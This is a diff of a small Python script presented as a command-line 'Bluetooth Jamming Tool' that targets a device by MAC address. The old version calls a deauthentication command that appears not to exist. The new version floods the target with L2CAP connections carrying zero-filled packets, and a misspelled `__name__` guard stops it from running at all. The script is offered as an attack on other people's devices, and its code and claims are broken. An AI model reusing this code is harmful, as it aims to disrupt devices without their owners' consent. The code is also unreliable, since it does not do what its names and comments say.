@@ -1,22 +1,35 @@
 import bluetooth
 import time
+import argparse
 
-def jam_bluetooth(target_address):
-    # Find the local Bluetooth adapter
-    local_device = bluetooth.discover_devices(lookup_names=True)[0]
-    local_address = local_device[0]
-    local_name = local_device[1]
+def jam_bluetooth(target_device, jamming_duration, jamming_interval):
+    print("Starting Bluetooth jamming...")
+    start_time = time.time()
 
-    # Find the target Bluetooth device
-    target_name = bluetooth.lookup_name(target_address)
+    while time.time() - start_time < jamming_duration:
+        try:
+            sock = bluetooth.BluetoothSocket(bluetooth.L2CAP)
+            sock.connect((target_device, 1))
+            sock.send(b"\x00" * 1024)  # Send a large packet of zeros
+            sock.close()
 
-    # Send deauthentication packets to the target device
-    for i in range(10):
-        bluetooth.hci_send_cmd(local_address, bluetooth.HCICmd.DEAUTH, [target_address])
-        time.sleep(0.1)
+            print("Jammed a packet to:", target_device)
+            time.sleep(jamming_interval)
+        except Exception as e:
+            print("Error:", e)
+            break
 
-    print(f"Jammed Bluetooth connection between {local_name} and {target_name}")
+    print("Bluetooth jamming completed.")
 
-# Example usage
-target_address = "01:23:45:67:89:AB"  # Replace with the target device's Bluetooth address
-jam_bluetooth(target_address)
+def main():
+    parser = argparse.ArgumentParser(description="Bluetooth Jamming Tool")
+    parser.add_argument("target_device", help="MAC address of the target Bluetooth device")
+    parser.add_argument("-d", "--duration", type=int, default=60, help="Jamming duration in seconds")
+    parser.add_argument("-i", "--interval", type=int, default=1, help="Jamming interval in seconds")
+
+    args = parser.parse_args()
+
+    jam_bluetooth(args.target_device, args.duration, args.interval)
+
+if _name_ == "_main_":
+    main()
